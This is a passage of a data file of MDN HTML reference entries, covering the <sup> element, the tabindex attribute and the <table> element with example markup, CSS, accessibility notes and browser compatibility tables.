and the end tag are mandatory.                                                                               |\n| Permitted parents                           | The [`<details>`](details) element.                                                                                                   |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                   |\n| Permitted ARIA roles                        | No `role` permitted                                                                                                                   |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                         |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|                     | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                     | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `summary`           | 12      | 79   | 49      | 15    | 6      | 18             | 49                  | 14            | 6             | 1.0              | 4               |     |\n| `display_list_item` | 89      | 89   | 49      | 75    | No     | 89             | 49                  | 63            | No            | 15.0             | 89              |     |\n\n## See also\n\n- [`<details>`](details)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/summary](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/summary)"
- name: summary (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`summary`](element/table#summary) Deprecated

    [`<table>`](element/table)
- name: sup
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<sup\\>: The Superscript element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fsup&level=high)\n\nThe `<sup>` [HTML](../index) element specifies inline text which is to be displayed as superscript for solely typographical reasons. Superscripts are usually rendered with a raised baseline using smaller text.\n\n## Try it\n\n#### HTML Demo: \\<sup\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>The <em>Pythagorean theorem</em> is often expressed as the following equation:</p>\n\n    <p>\n      <var>a<sup>2</sup></var> + <var>b<sup>2</sup></var> = <var>c<sup>2</sup></var>\n    </p>\n\n    p {\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\nThe `<sup>` element should only be used for typographical reasons—that is, to change the position of the text to comply with typographical conventions or standards, rather than solely for presentation or appearance purposes.\n\nFor example, to style the [wordmark](https://en.wikipedia.org/wiki/Wordmark) of a business or product which uses a raised baseline should be done using CSS (most likely [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align)) rather than `<sup>`. This would be done using, for example, `vertical-align: super` or, to shift the baseline up 50%, `vertical-align: 50%`.\n\nAppropriate use cases for `<sup>` include (but aren't necessarily limited to):\n\n- Displaying exponents, such as \"x³\". It may be worth considering the use of [MathML](https://developer.mozilla.org/en-US/docs/Web/MathML) for these, especially in more complex cases. See [Exponents](#exponents) under [Examples](#examples) below.\n- Displaying [superior lettering](https://en.wikipedia.org/wiki/Superior_letter), which is used in some languages when rendering certain abbreviations. For example, in French, the word \"mademoiselle\" can be abbreviated \"M^(lle)\"; this is an acceptable use case. See [Superior lettering](#superior_lettering) for examples.\n- Representing ordinal numbers, such as \"4^(th)\" instead of \"fourth.\" See [Ordinal numbers](#ordinal_numbers) for examples.\n\n## Examples\n\n### Exponents\n\nExponents, or powers of a number, are among the most common uses of superscripted text. For example:\n\nhtml\n\n```\n<p>\n  One of the most common equations in all of physics is <var>E</var>=<var>m</var\n  ><var>c</var><sup>2</sup>.\n</p>\n```\n\n#### Result\n\n### Superior lettering\n\nSuperior lettering is not technically the same thing as superscript. However, it is common to use `<sup>` to present superior lettering in HTML. Among the most common uses of superior lettering is the presentation of certain abbreviations in French:\n\nhtml\n\n```\n<p>Robert a présenté son rapport à M<sup>lle</sup> Bernard.</p>\n```\n\n#### Result\n\n### Ordinal numbers\n\nOrdinal numbers, such as \"fourth\" in English or \"quinto\" in Spanish may be abbreviated using numerals and language-specific text rendered in superscript:\n\nhtml\n\n```\n<p>\n  The ordinal number \"fifth\" can be abbreviated in various languages as follows:\n</p>\n<ul>\n  <li>English: 5<sup>th</sup></li>\n  <li>French: 5<sup>ème</sup></li>\n</ul>\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                |\n|---------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content.              |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                                    |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                          |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                                           |\n| Implicit ARIA role                          | [`superscript`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/structural_roles#structural_roles_with_html_equivalents) |\n| Permitted ARIA roles                        | Any                                                                                                                                            |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                                  |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `sup` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- The [`<sub>`](sub) HTML element that produces subscripts. Note that you cannot use `sub` and `sup` at the same time: you need to use [MathML](https://developer.mozilla.org/en-US/docs/Web/MathML) to produce both a superscript and a subscript next to the chemical symbol of an element, representing its atomic number and its nuclear number.\n- The [`<msub>`](https://developer.mozilla.org/en-US/docs/Web/MathML/Element/msub), [`<msup>`](https://developer.mozilla.org/en-US/docs/Web/MathML/Element/msup), and [`<msubsup>`](https://developer.mozilla.org/en-US/docs/Web/MathML/Element/msubsup) MathML elements.\n- The CSS [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align) property.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/sup](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/sup)"
- name: tabindex (attribute)
  summary: This feature is well established and works across many devices and browser versions
  description: "# tabindex\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since October 2018.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FGlobal_attributes%2Ftabindex&level=high)\n\nThe `tabindex` [global attribute](../global_attributes) allows developers to make HTML elements focusable, allow or prevent them from being sequentially focusable (usually with the Tab key, hence the name) and determine their relative ordering for sequential focus navigation.\n\n## Try it\n\n#### HTML Demo: tabindex\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>Click anywhere in this pane, then try tabbing through the elements.</p>\n\n    <label>First in tab order:<input type=\"text\" /></label>\n\n    <div tabindex=\"0\">Tabbable due to tabindex.</div>\n\n    <div>Not tabbable: no tabindex.</div>\n\n    <label>Third in tab order:<input type=\"text\" /></label>\n\n    p {\n      font-style: italic;\n      font-weight: bold;\n    }\n\n    div,\n    label {\n      display: block;\n      letter-spacing: 0.5px;\n      margin-bottom: 1rem;\n    }\n\n    div:focus {\n      font-weight: bold;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nIt accepts an integer as a value, with different results depending on the integer's value:\n\n**Note:** If an HTML element renders and has `tabindex` attribute with any valid integer value, the element can be focused with JavaScript (by calling the [`focus()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/focus) method) or visually by clicking with the mouse. The particular `tabindex` value controls whether the element is `tabbable` (i.e. reachable via sequential keyboard navigation, usually with the Tab key).\n\n- A *negative value* (the exact negative value doesn't actually matter, usually `tabindex=\"-1\"`) means that the element is not reachable via sequential keyboard navigation.\n  **Note:** `tabindex=\"-1\"` may be useful for elements that should not be navigated to directly using the Tab key, but need to have keyboard focus set to them. Examples include an off-screen modal window that should be focused when it comes into view, or a form submission error message that should be immediately focused when an errant form is submitted.\n- `tabindex=\"0\"` means that the element should be focusable in sequential keyboard navigation, after any positive `tabindex` values. The focus navigation order of these elements is defined by their order in the document source.\n- A *positive value* means the element should be focusable in sequential keyboard navigation, with its order defined by the value of the number. That is, `tabindex=\"4\"` is focused before `tabindex=\"5\"` and `tabindex=\"0\"`, but after `tabindex=\"3\"`. If multiple elements share the same positive `tabindex` value, their order relative to each other follows their position in the document source. The maximum value for `tabindex` is 32767.\n- If the `tabindex` attribute is included with no value set, whether the element is focusable is determined by the user agent.\n  **Warning:** You are recommended to only use `0` and `-1` as `tabindex` values. Avoid using `tabindex` values greater than `0` and CSS properties that can change the order of focusable HTML elements ([Ordering flex items](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_flexible_box_layout/Ordering_flex_items)). Doing so makes it difficult for people who rely on using keyboard for navigation or assistive technology to navigate and operate page content. Instead, write the document with the elements in a logical sequence.\n\nSome focusable HTML elements have a default `tabindex` value of `0` set under the hood by the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent). These elements are an [`<a>`](../element/a) or [`<area>`](../element/area) with `href` attribute, [`<button>`](../element/button), [`<frame>`](../element/frame) Deprecated , [`<iframe>`](../element/iframe), [`<input>`](../element/input), [`<object>`](../element/object), [`<select>`](../element/select), [`<textarea>`](../element/textarea), and SVG [`<a>`](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/a) element, or a [`<summary>`](../element/summary) element that provides summary for a [`<details>`](../element/details) element. Developers shouldn't add the `tabindex` attribute to these elements unless it changes the default behavior (for example, including a negative value will remove the element from the focus navigation order).\n\n**Warning:** The tabindex attribute must not be used on the [`<dialog>`](../element/dialog) element.\n\n## Accessibility concerns\n\nAvoid using the `tabindex` attribute in conjunction with non-[interactive content](../content_categories#interactive_content) to make something intended to be interactive focusable by keyboard input. An example of this would be using a [`<div>`](../element/div) element to describe a button, instead of the [`<button>`](../element/button) element.\n\nInteractive components authored using non-interactive elements are not listed in the [accessibility tree](https://developer.mozilla.org/en-US/docs/Learn/Accessibility/What_is_accessibility#accessibility_apis). This prevents assistive technology from being able to navigate to and manipulate those components. The content should be semantically described using interactive elements ([`<a>`](../element/a), [`<button>`](../element/button), [`<details>`](../element/details), [`<input>`](../element/input), [`<select>`](../element/select), [`<textarea>`](../element/textarea), etc.) instead. These elements have built-in roles and states that communicate status to the accessibility that would otherwise have to be managed by [ARIA](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA).\n\n- [Using the tabindex attribute \\| The Paciello Group](https://www.tpgi.com/using-the-tabindex-attribute/)\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `tabindex` | 1       | 12   | 1.5     | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- All [global attributes](../global_attributes)\n- [`HTMLElement.tabIndex`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/tabIndex) that reflects this attribute\n- Accessibility problems with `tabindex`: see [Don't Use Tabindex Greater than 0](https://adrianroselli.com/2014/11/dont-use-tabindex-greater-than-0.html) by Adrian Roselli\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/tabindex](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/tabindex)"
- name: table
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<table\\>: The Table element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Ftable&level=high)\n\nThe `<table>` [HTML](../index) element represents tabular data—that is, information presented in a two-dimensional table comprised of rows and columns of cells containing data.\n\n## Try it\n\n#### HTML Demo: \\<table\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <table>\n      <caption>\n        Front-end web developer course 2021\n      </caption>\n      <thead>\n        <tr>\n          <th scope=\"col\">Person</th>\n          <th scope=\"col\">Most interest in</th>\n          <th scope=\"col\">Age</th>\n        </tr>\n      </thead>\n      <tbody>\n        <tr>\n          <th scope=\"row\">Chris</th>\n          <td>HTML tables</td>\n          <td>22</td>\n        </tr>\n        <tr>\n          <th scope=\"row\">Dennis</th>\n          <td>Web accessibility</td>\n          <td>45</td>\n        </tr>\n        <tr>\n          <th scope=\"row\">Sarah</th>\n          <td>JavaScript frameworks</td>\n          <td>29</td>\n        </tr>\n        <tr>\n          <th scope=\"row\">Karen</th>\n          <td>Web performance</td>\n          <td>36</td>\n        </tr>\n      </tbody>\n      <tfoot>\n        <tr>\n          <th scope=\"row\" colspan=\"2\">Average age</th>\n          <td>33</td>\n        </tr>\n      </tfoot>\n    </table>\n\n    table {\n      border-collapse: collapse;\n      border: 2px solid rgb(140 140 140);\n      font-family: sans-serif;\n      font-size: 0.8rem;\n      letter-spacing: 1px;\n    }\n\n    caption {\n      caption-side: bottom;\n      padding: 10px;\n      font-weight: bold;\n    }\n\n    thead,\n    tfoot {\n      background-color: rgb(228 240 245);\n    }\n\n    th,\n    td {\n      border: 1px solid rgb(160 160 160);\n      padding: 8px 10px;\n    }\n\n    td:last-of-type {\n      text-align: center;\n    }\n\n    tbody > tr:nth-of-type(even) {\n      background-color: rgb(237 238 242);\n    }\n\n    tfoot th {\n      text-align: right;\n    }\n\n    tfoot td {\n      font-weight: bold;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n### Deprecated attributes\n\nThe following attributes are deprecated and should not be used. They are documented below for reference when updating existing code and for historical interest only.\n\n[`align`](#align) Deprecated  \nSpecifies the horizontal alignment of the table within its parent element. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `left`, `center`, and `right`. Use the [`margin-inline-start`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin-inline-start) and [`margin-inline-end`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin-inline-end) CSS properties instead, as this attribute is deprecated.\n\n[`bgcolor`](#bgcolor) Deprecated  \nDefines the background color of the table. The value is an HTML color; either a [6-digit hexadecimal RGB code](https://developer.mozilla.org/en-US/docs/Web/CSS/hex-color), prefixed by a '`#`', or a [color keyword](https://developer.mozilla.org/en-US/docs/Web/CSS/named-color). Other CSS [`<color>`](https://developer.mozilla.org/en-US/docs/Web/CSS/color_value) values are not supported. Use the [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color) CSS property instead, as this attribute is deprecated.\n\n[`border`](#border) Deprecated  \nDefines, as a non-negative integer value (in pixels), the size of the frame surrounding the table. If set to `0`, the [`frame`](#frame) attribute is set to void. Use the [`border`](https://developer.mozilla.org/en-US/docs/Web/CSS/border) CSS property instead, as this attribute is deprecated.\n\n[`cellpadding`](#cellpadding) Deprecated  \nDefines the space between the content of a cell and its border. This attribute is obsolete: instead of using it, apply the [`padding`](https://developer.mozilla.org/en-US/docs/Web/CSS/padding) CSS property to the [`<th>`](th) and [`<td>`](td) elements.\n\n[`cellspacing`](#cellspacing) Deprecated  \nDefines the size of the space between two cells. This attribute is obsolete: instead of using it, set the [`border-spacing`](https://developer.mozilla.org/en-US/docs/Web/CSS/border-spacing) CSS property on the `<table>` element. Note that this has no effect if the `<table>` element's [`border-collapse`](https://developer.mozilla.org/en-US/docs/Web/CSS/border-collapse) CSS property is set to `collapse`.\n\n[`frame`](#frame) Deprecated  \nDefines which side of the frame surrounding the table must be displayed. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `void`, `above`, `below`, `hsides`, `vsides`, `lhs`, `rhs`, `box` and `border`. Use the [`border-style`](https://developer.mozilla.org/en-US/docs/Web/CSS/border-style) and [`border-width`](https://developer.mozilla.org/en-US/docs/Web/CSS/border-width) CSS properties instead, as this attribute is deprecated.\n\n[`rules`](#rules) Deprecated  \nDefines where rules (borders) are displayed in the table. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `none` (default value), `groups` ([`<thead>`](thead), [`<tbody>`](tbody), and [`<tfoot>`](tfoot) elements), `rows` (horizontal lines), `cols` (vertical lines), and `all` (border around every cell). Use the [`border`](https://developer.mozilla.org/en-US/docs/Web/CSS/border) CSS property on the appropriate table-related elements, as well as on the `<table>` itself, instead, as this attribute is deprecated.\n\n[`summary`](#summary) Deprecated  \nDefines an alternative text that summarizes the content of the table. Use the [`<caption>`](caption) element instead, as this attribute is deprecated.\n\n[`width`](#width) Deprecated  \nSpecifies the width of the table. Use the [`width`](https://developer.mozilla.org/en-US/docs/Web/CSS/width) CSS property instead, as this attribute is deprecated.\n\n**Note:** While no HTML specification includes `height` as a `<table>` attribute, some browsers support a non-standard interpretation of `height`. The unitless value sets a minimum absolute height in pixels. If set as a percent value, the minimum table height will be relative to the parent container's height. Use the [`min-height`](https://developer.mozilla.org/en-US/docs/Web/CSS/min-height) CSS property instead, as this attribute is deprecated.\n\n## Visual layout of table contents\n\nFollowing elements are part of the table structure:\n\n- [`<caption>`](caption)\n- [`<thead>`](thead)\n- [`<colgroup>`](colgroup)\n- [`<col>`](col)\n- [`<th>`](th)\n- [`<tbody>`](tbody)\n- [`<tr>`](tr)\n- [`<td>`](td)\n- [`<tfoot>`](tfoot)\n\nThe `<table>` box establishes a table formatting context. Elements inside the `<table>` generate rectangular boxes. Each box occupies a number of table cells according to the following rules:\n\n1.  The row boxes fill the table in the source code order from top to bottom. Each row box occupies one row of cells.\n2.  A row group box occupies one or more row boxes.\n3.  Column boxes are placed next to each other in source code order. Depending on the value of the [`dir`](../global_attributes/dir) attribute, the columns are laid in left-to-right or right-to-left direction. A column box occupies one or more columns of table cells.\n4.  A column group box occupies one or more column boxes.\n5.  A cell box may span over multiple rows and columns. User agents trim cells to fit in the available number of rows and columns.\n\nTable cells do have padding. Boxes that make up a table do not have margins.\n\n### Table layers and transparency\n\nFor styling purpose the table elements may be thought of as being put on six superimposed layers:\n\nThe background set on an element in one layer will be visible only if the layers above it have transparent background. A missing cell is rendered as if an anonymous table-cell box occupied that place.\n\n## Accessibility\n\n### Captions\n\nBy supplying a [`<caption>`](caption) element whose value clearly and concisely describes the table's purpose, it helps the people decide if they need to check the rest of the table content or skip over it.\n\nThis helps people navigating with the aid of assistive technology such as a screen reader, people experiencing low vision conditions, and people with cognitive concerns.\n\n- [MDN Adding a caption to your table with \\<caption\\>](https://developer.mozilla.org/en-US/docs/Learn/HTML/Tables/Advanced#adding_a_caption_to_your_table_with_caption)\n- [Caption & Summary • Tables • W3C WAI Web Accessibility Tutorials](https://www.w3.org/WAI/tutorials/tables/caption-summary/)\n\n### Scoping rows and columns\n\nThe [`scope`](th#scope) attribute on header cells ([`<th>`](th) elements) is redundant in simple contexts, because scope is inferred. However, some assistive technologies may fail to draw correct inferences, so specifying header scope may improve user experiences. In complex tables, [`scope`](th#scope) can be specified to provide necessary information about the cells related to a header.\n\n- [MDN Tables for visually impaired users](https://developer.mozilla.org/en-US/docs/Learn/HTML/Tables/Advanced#tables_for_visually_impaired_users)\n- [Tables with two headers • Tables • W3C WAI Web Accessibility Tutorials](https://www.w3.org/WAI/tutorials/tables/two-headers/)\n- [Tables with irregular headers • Tables • W3C WAI Web Accessibility Tutorials](https://www.w3.org/WAI/tutorials/tables/irregular/)\n- [H63: Using the scope attribute to associate header cells and data cells in data tables \\| W3C Techniques for WCAG 2.0](https://www.w3.org/TR/WCAG20-TECHS/H63.html)\n\n### Complicated tables\n\nAssistive technologies such as screen readers may have difficulty parsing tables that are so complex that header cells can't be associated in a strictly horizontal or vertical way. This is typically indicated by the presence of the [`colspan`](td#colspan) and [`rowspan`](td#rowspan) attributes.\n\nIdeally, consider alternate ways to present the table's content, including breaking it apart into a collection of smaller, related tables that don't have to rely on using the [`colspan`](td#colspan) and [`rowspan`](td#rowspan) attributes. In addition to helping people who use assistive technology understand the table's content, this may also benefit people with cognitive concerns who may have difficulty understanding the associations the table layout is describing.\n\nIf the table cannot be broken apart, use a combination of the [`id`](../global_attributes#id) and [`headers`](td#headers) attributes to programmatically associate each table cell with the header(s) ([`<th>`](th) elements) the cell is associated with.\n\n- [MDN Tables for visually impaired users](https://developer.mozilla.org/en-US/docs/Learn/HTML/Tables/Advanced#tables_for_visually_impaired_users)\n- [Tables with multi-level headers • Tables • W3C WAI Web Accessibility Tutorials](https://www.w3.org/WAI/tutorials/tables/multi-level/)\n- [H43: Using id and headers attributes to associate data cells with header cells in data tables \\| Techniques for W3C WCAG 2.0](https://www.w3.org/TR/WCAG20-TECHS/H43.html)\n\n## Examples\n\nThe examples below include tables of progressively increasing complexity. For additional examples, including an in-depth tutorial, see the [HTML tables](https://developer.mozilla.org/en-US/docs/Learn/HTML/Tables) series in the [Learn web development](https://developer.mozilla.org/en-US/docs/Learn) area, where you'll learn how to use the table elements and their attributes to correctly structure your tabular data. A [Styling tables](https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Styling_tables) guide provides table styling information, including common, useful techniques.\n\nSince the structure of a `<table>` involves the use of several table-related HTML elements along with various associated attributes, the following examples are intended to provide a simplified explanation that covers the basics and common standards. Additional and more detailed information can be found on the corresponding linked pages.\n\nThese table examples demonstrate how to create an [accessible](https://developer.mozilla.org/en-US/docs/Glossary/Accessibility) table that is structured with HTML and styled with [CSS](https://developer.mozilla.org/en-US/docs/Web/CSS).\n\nBecause of how HTML tables are structured, the [markup](https://developer.mozilla.org/en-US/docs/Glossary/Markup) can quickly grow. For this reason, it is important to clearly define the table's purpose and final appearance to create the appropriate structure. A logical structure developed with [semantic](https://developer.mozilla.org/en-US/docs/Glossary/Semantics) markup is not only easier to style, but enables useful and accessible tables that can be understood and navigated by everyone, including search engines and users of assistive technologies.\n\nThe first example is basic, with subsequent examples growing in complexity. First, we will develop a very basic HTML table structure for the table. The first two examples contain no table section groups such as a defined head, body, or foot, and involve no cell spanning or explicitly defined cell relationships. Not even a caption is provided. As we work through the examples, they will be progressively enhanced to include all the table features that a complex data table should possess.\n\n### Basic table\n\nThis example includes a *very* basic table with three rows and two columns. To demonstrate default browser table styles, no CSS has been included in this example.\n\n#### HTML\n\nThe table rows are defined with [`<tr>`](tr) elements, and the columns are defined with table header and data cells within them. The first row contains the header cells ([`<th>`](th) elements) that serve as column headers for the data cells ([`<td>`](td) elements). Each element ([`<th>`](th) or [`<td>`](td)) per row is in its respective column—that is, the first element of a row is in the first column, and the second element of that row is in the second column.\n\nhtml\n\n```\n<table>\n  <tr>\n    <th>Name</th>\n    <th>Age</th>\n  </tr>\n  <tr>\n    <td>Maria Sanchez</td>\n    <td>28</td>\n  </tr>\n  <tr>\n    <td>Michael Johnson</td>\n    <td>34</td>\n  </tr>\n</table>\n```\n\n#### Result\n\nThere is no custom [CSS](https://developer.mozilla.org/en-US/docs/Web/CSS) or [user stylesheet](https://developer.mozilla.org/en-US/docs/Web/CSS/Cascade#author_stylesheets) applied to this table. The styling results purely from the [user-agent stylesheet](https://developer.mozilla.org/en-US/docs/Web/CSS/Cascade#user-agent_stylesheets).\n\n### Expanded table with header cells\n\nThis example extends the [basic table](#basic_table), extending the content and adding basic CSS styles.\n\n#### HTML\n\nThe table comprises four rows ([`<tr>`](tr) elements) now, with four columns each. The first row is a row of header cells (The first row contains only [`<th>`](th) elements). Subsequent rows include a header column ([`<th>`](th) elements as the first child elements of each row) and three data columns ([`<td>`](td) elements). As table sectioning elements are not used, the browser automatically defines the content group structure, i.e., all rows are wrapped within the body of the table of an implicit [`<tbody>`](tbody) element.\n\nhtml\n\n```\n<table>\n  <tr>\n    <th>Name</th>\n    <th>ID</th>\n    <th>Member Since</th>\n    <th>Balance</th>\n  </tr>\n  <tr>\n    <th>Margaret Nguyen</th>\n    <td>427311</td>\n    <td><time datetime=\"2010-06-03\">June 3, 2010</time></td>\n    <td>0.00</td>\n  </tr>\n  <tr>\n    <th>Edvard Galinski</th>\n    <td>533175</td>\n    <td><time datetime=\"2011-01-13\">January 13, 2011</time></td>\n    <td>37.00</td>\n  </tr>\n  <tr>\n    <th>Hoshi Nakamura</th>\n    <td>601942</td>\n    <td><time datetime=\"2012-07-23\">July 23, 2012</time></td>\n    <td>15.00</td>\n  </tr>\n</table>\n```\n\n#### CSS\n\nWith CSS, we provide the basic styling to create lines around the components of the table to make the data structure clearer. The CSS adds a solid border around the `<table>` and around each of the table's cells, including those specified with both [`<th>`](th) and [`<td>`](td) elements, demarcating every header and data cells.\n\ncss\n\n```\ntable {\n  border: 2px solid rgb(140 140 140);\n}\n\nth,\ntd {\n  border: 1px solid rgb(160 160 160);\n}\n```\n\n#### Result\n\n### Specifying table cell relations\n\nBefore moving on to extend the table in more advanced ways, it's advisable to improve [accessibility](https://developer.mozilla.org/en-US/docs/Glossary/Accessibility) by defining relationships between the header and data cells ([`<th>`](th) and [`<td>`](td) elements).\n\n#### HTML\n\nThis is accomplished by introducing the [`scope`](th#scope) attribute on the [`<th>`](th) elements and setting the values to the corresponding `col` (column) or `row` value.\n\nhtml\n\n```\n<table>\n  <tr>\n    <th scope=\"col\">Name</th>\n    <th scope=\"col\">ID</th>\n    <th scope=\"col\">Member Since</th>\n    <th scope=\"col\">Balance</th>\n  </tr>\n  <tr>\n    <th scope=\"row\">Margaret Nguyen</th>\n    <td>427311</td>\n    <td><time datetime=\"2010-06-03\">June 3, 2010</time></td>\n    <td>0.00</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">Edvard Galinski</th>\n    <td>533175</td>\n    <td><time datetime=\"2011-01-13\">January 13, 2011</time></td>\n    <td>37.00</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">Hoshi Nakamura</th>\n    <td>601942</td>\n    <td><time datetime=\"2012-07-23\">July 23, 2012</time></td>\n    <td>15.00</td>\n  </tr>\n</table>\n```\n\nThe CSS and visual result are unchanged—the adaptation provides valuable contextual information for assistive technologies such as screen readers to help identify which cells the headers relate to.\n\n**Note:** If the table structure is even more complex, the (additional) use of the [`headers`](th#headers) attribute on the [`<th>`](th) and [`<td>`](td) elements may improve accessibility and help assistive technologies identify the relationships between cells; see [Complicated tables](#complicated_tables).\n\n### Explicitly specifying table section groups\n\nIn addition to improving accessibility by [specifying cell relations](#specifying_table_cell_relations), the [semantics](https://developer.mozilla.org/en-US/docs/Glossary/Semantics) of the table can be improved by introducing table section groups.\n\n#### HTML\n\nSince the first row ([`<tr>`](tr) element) contains only column header cells and provides the header for the rest of the table's contents, it can be enclosed in the [`<thead>`](thead) element to explicitly specify that row as the head section of the table. Moreover, what is automatically accomplished by the browser can also be defined explicitly—the body section of the table, which contains the main data of the table, is specified by enclosing the corresponding rows in the [`<tbody>`](tbody) element. The explicit use of the [`<tbody>`](tbody) element helps the browser to create the intended table structure, avoiding unwanted results.\n\nhtml\n\n```\n<table>\n  <thead>\n    <tr>\n      <th scope=\"col\">Name</th>\n      <th scope=\"col\">ID</th>\n      <th scope=\"col\">Member Since</th>\n      <th scope=\"col\">Balance</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th scope=\"row\">Margaret Nguyen</th>\n      <td>427311</td>\n      <td><time datetime=\"2010-06-03\">June 3, 2010</time></td>\n      <td>0.00</td>\n    </tr>\n    <tr>\n      <th scope=\"row\">Edvard Galinski</th>\n      <td>533175</td>\n      <td><time datetime=\"2011-01-13\">January 13, 2011</time></td>\n      <td>37.00</td>\n    </tr>\n    <tr>\n      <th scope=\"row\">Hoshi Nakamura</th>\n      <td>601942</td>\n      <td><time datetime=\"2012-07-23\">July 23, 2012</time></td>\n      <td>15.00</td>\n    </tr>\n  </tbody>\n</table>\n```\n\nOnce again, the CSS and visual result are unchanged—specifying such table section groups provides valuable contextual information for assistive technologies, including screen readers and search engines, as well as for styling in the CSS, which will be shown in a later example.\n\n### Column and row spanning\n\nIn this example, we extend the table even more by adding a column and introducing a multi-row head section.\n\n#### HTML\n\nBuilding on the table created so far, a new 